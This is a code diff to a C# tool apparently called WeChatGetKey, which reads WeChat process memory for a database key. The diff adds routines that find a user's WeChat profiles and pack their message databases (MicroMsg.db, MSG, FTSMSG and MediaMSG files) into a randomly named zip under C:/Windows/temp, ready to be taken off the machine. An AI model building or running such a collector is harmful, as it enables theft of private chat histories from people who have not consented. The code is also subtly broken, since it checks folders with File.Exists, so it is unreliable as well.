@@ -1,8 +1,11 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.IO.Compression;
+using System.Linq;
 
 namespace WeChatGetKey
 {
@@ -10,20 +13,38 @@ namespace WeChatGetKey
 	{
 		private static void Main(string[] args)
 		{
-			try
-			{
-				Program.ReadTest();
-			}
-			catch (Exception ex)
-			{
-				Console.WriteLine("Error：" + ex.Message);
-			}
-			finally
-			{
-				//Console.ReadKey();
-			}
-			Console.WriteLine("[+] Done");
-		}
+            try
+            {
+                if (args.Length == 0)
+                {
+                    ReadTest();
+                    string[] wxpaths = FindWx();
+                    if (wxpaths.Length == 0)
+                    {
+						Console.WriteLine("[-] not default wechat documents");
+						return;
+                    }
+                    foreach (string item in wxpaths)
+                    {
+						Program.PackageWx(item);
+                    }
+                }
+                else
+                {
+                    Program.PackageWx(args[0]);
+                }
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error：" + ex.Message);
+            }
+            finally
+            {
+                //Console.ReadKey();
+            }
+            Console.WriteLine("[+] Done");
+        }
 		private static void ReadTest()
 		{
 			List<int> SupportList = null;
@@ -102,6 +123,87 @@ namespace WeChatGetKey
 				return;
 			}
 		}
+
+		private static string[] FindWx()
+        {
+			string wxdoc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "WeChat Files");
+			List<string> wxids = new List<string>();
+
+			if (!File.Exists(wxdoc))
+			{
+				return wxids.ToArray();
+            }
+
+			DirectoryInfo theFolder = new DirectoryInfo(wxdoc);
+			foreach (FileInfo file in theFolder.GetFiles())
+            {
+				if (file.Name.StartsWith("wxid")) {
+					wxids.Add(file.FullName);
+                }
+            }
+			return wxids.ToArray();
+        }
+		private static void PackageWx(string path)
+		{
+			if (!File.Exists(path))
+            {
+				Console.WriteLine(path + "not exists");
+				return;
+            }
+			string despath = @"C:/Windows/temp/";
+			DirectoryInfo theFolder = new DirectoryInfo(Path.Combine(path,"Msg/Multi"));
+			string zipPath = @"C:/Windows/temp/" + GenerateRandomString(8) + ".zip"; ;
+			using (ZipArchive archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
+			{
+				Program.Archiver(archive, new FileInfo(Path.Combine(path, "Msg/MicroMsg.db")));
+				foreach (FileInfo NextFile in theFolder.GetFiles())
+				{
+                    if (NextFile.Name.StartsWith("FTSMSG") && NextFile.Name.EndsWith("db"))
+					{
+						Program.Archiver(archive, NextFile);
+					}
+					else if (NextFile.Name.StartsWith("MediaMSG") && NextFile.Name.EndsWith("db"))
+					{
+						Program.Archiver(archive, NextFile);
+					}
+					else if (NextFile.Name.StartsWith("MSG") && NextFile.Name.EndsWith("db"))
+					{
+						Program.Archiver(archive, NextFile);
+					}
+				}
+			}
+			Console.WriteLine("[+] Package file to " + zipPath);
+			//遍历文件
+
+		}
+
+		private static bool Archiver(ZipArchive zip,  FileInfo NextFile)
+        {
+			string despath = @"C:/Windows/temp/";
+			try
+            {
+				string newName = despath + NextFile.Name;
+				File.Copy(NextFile.FullName, newName);
+				zip.CreateEntryFromFile(newName, NextFile.Name);
+				File.Delete(newName);
+				Console.WriteLine("archive " + NextFile.Name + "successfully");
+				return true;
+			}
+            catch (Exception)
+            {
+				Console.WriteLine("archive " + NextFile.Name + "failure");
+				return false;
+            }
+        }
+		static string GenerateRandomString(int length)
+		{
+			const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+			var random = new Random();
+
+			return new string(Enumerable.Repeat(chars, length)
+			  .Select(s => s[random.Next(s.Length)]).ToArray());
+		}
+
 		private static string GetName(IntPtr hProcess, IntPtr lpBaseAddress, int nSize = 100)
 		{
 			byte[] array = new byte[nSize];
